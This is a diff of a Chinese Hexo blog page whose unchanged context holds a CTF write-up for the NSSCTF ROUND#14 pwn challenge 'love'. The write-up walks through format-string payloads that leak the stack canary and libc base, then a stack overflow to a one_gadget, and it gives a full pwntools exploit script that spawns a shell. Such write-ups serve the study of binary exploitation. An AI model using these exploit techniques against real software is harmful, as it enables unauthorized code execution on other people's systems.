@@ -1,6 +1,8 @@
 <!DOCTYPE html>
 <html lang="zh-CN">
-<head>
+<head><!-- hexo injector head_begin start -->
+<link rel="stylesheet" href="/css/bilicard.css">
+<!-- hexo injector head_begin end -->
   <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width">
 <meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
@@ -149,7 +151,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#NSSCTF-ROUND-14"><span class="nav-text">NSSCTF ROUND#14</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#love"><span class="nav-text">love</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01"><span class="nav-text">0x01</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02"><span class="nav-text">0x02</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%AC%AC%E4%B8%80%E6%AD%A5"><span class="nav-text">第一步</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%AC%AC%E4%BA%8C%E6%AD%A5"><span class="nav-text">第二步</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03"><span class="nav-text">0x03</span></a></li></ol></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-text">NSSCTF ROUND#14</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-text">love</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-text">0x01</span></a></li><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-text">0x02</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link"><span class="nav-text">第一步</span></a></li><li class="nav-item nav-level-4"><a class="nav-link"><span class="nav-text">第二步</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-text">0x03</span></a></li></ol></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -175,7 +177,7 @@
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-count">7</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -367,7 +369,7 @@
     
     
     <div class="post-body" itemprop="articleBody">
-        <h1 id="NSSCTF-ROUND-14"><a href="#NSSCTF-ROUND-14" class="headerlink" title="NSSCTF ROUND#14"></a>NSSCTF ROUND#14</h1><h2 id="love"><a href="#love" class="headerlink" title="love"></a>love</h2><h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>程序开启NX和canary保护</p>
+        <h1><span id="nssctf-round14">NSSCTF ROUND#14</span></h1><h2><span id="love">love</span></h2><h3><span id="0x01">0x01</span></h3><p>程序开启NX和canary保护</p>
 <p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308101239901.png" alt="image-20230810123951784"></p>
 <p>vuln函数中存在栈溢出</p>
 <p>变量v4 &#x3D; 555，v5 &#x3D; 520</p>
@@ -381,7 +383,7 @@
 </ol>
 <span id="more"></span>
 
-<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><h4 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h4><p>将v4写为520。如图在栈偏移为3的地方有一个栈链：0x7ffe9c35d798-&gt;0x7ffe9c35d788&lt;-0x22b，可以用来修改0x22b为0x208</p>
+<h3><span id="0x02">0x02</span></h3><h4><span id="第一步">第一步</span></h4><p>将v4写为520。如图在栈偏移为3的地方有一个栈链：0x7ffe9c35d798-&gt;0x7ffe9c35d788&lt;-0x22b，可以用来修改0x22b为0x208</p>
 <p>这里可构造pay为</p>
 <blockquote>
 <p>pay &#x3D; ‘%’+str(8)+’c’+’%9$hhn’</p>
@@ -390,7 +392,7 @@
 </blockquote>
 <p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308101251928.png" alt="image-20230810125122840"></p>
 <p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308101249495.png" alt="image-20230810124947461"></p>
-<h4 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h4><p>泄露canary 和 __libc_start_main地址</p>
+<h4><span id="第二步">第二步</span></h4><p>泄露canary 和 __libc_start_main地址</p>
 <p>这里需要先patchelf再调试确定偏移</p>
 <p>这题不仅要patch掉libc和ld，还要再patchelf –replace-needed libpthread.so.0 .&#x2F;libpthread-2.31.so .&#x2F;binary</p>
 <p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308101359262.png" alt="image-20230810135900218"></p>
@@ -398,7 +400,7 @@
 <blockquote>
 <p>pay +&#x3D; ‘-%15$p-%17$p-‘</p>
 </blockquote>
-<h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><p>覆盖返回地址为one_gadget，或者调用system函数</p>
+<h2><span id="0x03">0x03</span></h2><p>覆盖返回地址为one_gadget，或者调用system函数</p>
 <p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308101404124.png" alt="image-20230810140417092"></p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;node4.anna.nssctf.cn&#x27;,28157)</span></span><br><span class="line"></span><br><span class="line">sda = <span class="keyword">lambda</span> delim,data :p.sendafter(delim,data)</span><br><span class="line">sd = <span class="keyword">lambda</span> data :p.send(data)</span><br><span class="line">sea = <span class="keyword">lambda</span> delim,data :p.sendafter(delim,data)</span><br><span class="line">sl = <span class="keyword">lambda</span> data :p.sendline(data)</span><br><span class="line">sla = <span class="keyword">lambda</span> delim,data :p.sendlineafter(delim,data)</span><br><span class="line">ru = <span class="keyword">lambda</span> delims,drop=<span class="literal">True</span> :p.recvuntil(delims,drop)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data :u32(data.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data :u64(data.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">lg = <span class="keyword">lambda</span> name,addr :log.success(name+<span class="string">&#x27;=&#x27;</span>+<span class="built_in">hex</span>(addr))</span><br><span class="line">ra = <span class="keyword">lambda</span> :p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr64</span>() : <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr32</span>() : <span class="keyword">return</span> u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pay = <span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">520</span>)+<span class="string">&#x27;c&#x27;</span>+<span class="string">&#x27;%9$hhn&#x27;</span></span><br><span class="line">pay += <span class="string">&#x27;-%15$p-%17$p-&#x27;</span></span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line">sla(<span class="string">b&#x27;Toka\n&#x27;</span>,pay)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ru(<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line"><span class="comment">#泄露cannary</span></span><br><span class="line">canary = <span class="built_in">int</span>(ru(<span class="string">&#x27;-&#x27;</span>),<span class="number">16</span>)</span><br><span class="line"><span class="comment">#libc</span></span><br><span class="line">libc_base = <span class="built_in">int</span>(ru(<span class="string">&#x27;-&#x27;</span>),<span class="number">16</span>)-<span class="number">243</span>-libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x00000000004013f3</span> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#pay=b&#x27;A&#x27;*0x28+p64(canary)+b&#x27;A&#x27;*8+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(elf.sym[&#x27;vuln&#x27;])</span></span><br><span class="line"><span class="comment">#sla(&#x27;level\n&#x27;,pay)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#libcbase = get_addr64()-libc.sym[&#x27;puts&#x27;]</span></span><br><span class="line"><span class="comment">#lg(&#x27;libcbase&#x27;,libcbase)</span></span><br><span class="line">lg(<span class="string">&#x27;canary&#x27;</span>,canary)</span><br><span class="line">lg(<span class="string">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class="line"></span><br><span class="line">system_addr = libc_base+libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">bin_sh_addr=libc_base+libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>).__next__()</span><br><span class="line"></span><br><span class="line">lg(<span class="string">&#x27;system&#x27;</span>,system_addr)</span><br><span class="line">lg(<span class="string">&#x27;binsh&#x27;</span>,bin_sh_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ru(<span class="string">&#x27;level\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ret =<span class="number">0x000000000040101a</span> </span><br><span class="line"></span><br><span class="line">og = [<span class="number">0xe3afe</span>,<span class="number">0xe3b01</span>,<span class="number">0xe3b04</span>]</span><br><span class="line">pay = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(canary)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(ret)+p64(og[<span class="number">1</span>]+libc_base)</span><br><span class="line"><span class="comment">#pay = b&#x27;a&#x27;*0x28+p64(canary)+b&#x27;a&#x27;*8+p64(ret)+p64(pop_rdi)+p64(bin_sh_addr)+p64(system_addr)</span></span><br><span class="line"></span><br><span class="line">sl(pay)</span><br><span class="line"></span><br><span class="line">ra()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
@@ -544,13 +546,13 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-line"></i>
     </span>
-    <span title="站点总字数">211k</span>
+    <span title="站点总字数">212k</span>
   </span>
   <span class="post-meta-item">
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">3:12</span>
+    <span title="站点阅读时长">3:13</span>
   </span>
 </div>
 <div class="busuanzi-count">
